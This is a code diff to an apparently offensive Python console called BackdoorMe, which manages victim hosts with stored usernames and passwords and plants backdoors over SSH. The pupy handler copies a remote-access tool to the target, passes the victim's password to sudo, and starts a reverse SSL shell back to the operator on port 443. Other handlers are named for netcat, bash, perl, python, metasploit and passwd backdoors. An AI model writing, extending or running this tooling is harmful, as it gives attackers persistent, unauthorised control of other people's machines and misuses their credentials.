@@ -44,7 +44,26 @@ class BackdoorMe(cmd.Cmd):
         self.targets[self.target_num] = t
         self.target_num += 1
         self.curtarget = t
-    
+
+    def do_edittarget(self, args):
+        t = self.get_target(args)
+        if t == None:
+            return
+        hostname = raw_input('Target Hostname: ') #victim host
+        try:
+            socket.inet_aton(hostname)
+        except socket.error:
+            print BAD + "Invalid IP Address."
+            return 
+        uname = raw_input('Username: ') #username for the box to be attacked
+        pword = raw_input('Password: ') #password for the box to be attacked
+        self.target_num -= 1
+
+        print GOOD + "Target %d edited" % self.target_num
+        t = target.Target(hostname, uname, pword, self.target_num)
+        self.targets[self.target_num] = t
+        self.curtarget = t
+
     def do_settarget(self, args):
         if len(args) == 0 or not target_exists(int(args[0])):
             print BAD + "No target with that number found. Try adding a target with \"addtarget\" or trying a different target number."
@@ -54,21 +73,38 @@ class BackdoorMe(cmd.Cmd):
     
     def do_open(self, args):
         t = self.get_target(args)
+        if t == None:
+            return
         try: 
             t.conn()
         except:
             print BAD + "Connection failed."
             return
         print GOOD + "Connection established."
-    
+
+    def do_close(self, args):
+        t = self.get_target(args)
+        if t == None:
+            return
+        try: 
+            t.close()
+        except:
+            print BAD + "Connection could not be closed."
+            return
+        print GOOD + "Connection closed."
+
     def get_target(self, args):
         t = self.curtarget
                 
         if (len(args) == 0):
-            print GOOD + "Using current target %d." % t.target_num
+            if self.curtarget == None:
+                print BAD + "No currently set target. Add a target with 'addtarget'."
+                return None
+            else:
+                print GOOD + "Using current target %d." % t.target_num
         elif not self.target_exists(int(args[0])):
             print BAD + "No target with that target ID found." 
-            return
+            return None
         else:
             print GOOD + "Using target %s" % args[0]
             t = self.targets[int(args[0])]
@@ -79,6 +115,8 @@ class BackdoorMe(cmd.Cmd):
  
     def do_netcat(self, args):
         t = self.get_target(args)
+        if t == None:
+            return
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -91,6 +129,9 @@ class BackdoorMe(cmd.Cmd):
 
     def do_perl(self,args):
         t = self.get_target(args)
+        if t == None:
+            return
+
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -119,6 +160,9 @@ class BackdoorMe(cmd.Cmd):
 
     def do_bash(self, args):
         t = self.get_target(args)
+        if t == None:
+            return
+
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -129,20 +173,26 @@ class BackdoorMe(cmd.Cmd):
         print(GOOD + "Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + t.pword)
 
     def do_pupy(self, args):
-	t=self.get_target(args)
-	if not t.is_open:
-	    print BAD + "No SSH connection to target. Run \"open\" to start a connection."
+        t=self.get_target(args)
+        if t == None:
             return
-	self.curtarget.ssh.exec_command('rm -r pupy')
-	self.curtarget.scpFiles(self, 'pupy', True)
-	self.curtarget.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
-	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
-	raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
-	self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.localIP + ":443")
-	raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
+        if not t.is_open:
+            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
+            return
+	    
+        self.curtarget.ssh.exec_command('rm -r pupy')
+        self.curtarget.scpFiles(self, 'pupy', True)
+        self.curtarget.scpFiles(self, '/usr/local/lib/python2.7/dist-packages/rpyc', True)
+        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
+        raw_input("Please navigate to the pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
+        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S python pupy/client/reverse_ssl.py " + self.localIP + ":443")
+        raw_input(GOOD + "Backdoor attempted on target machine. To run a command, type sessions -i [id] and then 'exec <commandname>.")
 
     def do_python(self, args):
         t = self.get_target(args)
+        if t == None:
+            return
+
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -171,6 +221,8 @@ class BackdoorMe(cmd.Cmd):
 
     def do_metasploit(self,args):
         t = self.get_target(args)
+        if t == None:
+            return
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -196,6 +248,8 @@ class BackdoorMe(cmd.Cmd):
 
     def do_passwd(self, args):
         t = self.get_target(args)
+        if t == None:
+            return
         if not t.is_open:
             print BAD + "No SSH connection to target. Run \"open\" to start a connection."
             return
@@ -212,8 +266,20 @@ class BackdoorMe(cmd.Cmd):
         except socket.error:
             print BAD + "Invalid IP Address."
             return 
-
         print(GOOD + "Local IP is now: " + newIP)
+    
+    def do_change_port(self, args):
+        t = self.get_target(args)
+        if t == None:
+            return
+
+        newPort = raw_input("Please enter the port you want to use for future connections: ")
+        t.port = newPort;
+        print(GOOD + "SSH Port for target is now: " + t.port)
+        if (raw_input("Enter y if you'd like to restart the SSH connection with the new port now: ") == 'y'):
+            self.do_close(self, args)
+            self.do_open(self, args)
+        
 
     def do_private_key(self, args):
         t = self.get_target(args)
@@ -223,7 +289,8 @@ class BackdoorMe(cmd.Cmd):
     def do_quit(self, args):
         print "Exiting"
         exit()
-
+    def do_clear(self, args):
+        os.system("clear")
     def do_list(self, args):
         print "Targets: "
         for num, t in self.targets.iteritems():
@@ -246,7 +313,8 @@ class BackdoorMe(cmd.Cmd):
         return line 
     def default(self, line):       
         try:
-            exec(line) in self._locals, self._globals
+            print GOOD + "Executing \"" + line + "\""
+            os.system(line)
         except Exception, e:
             print e.__class__, ":", e 
  
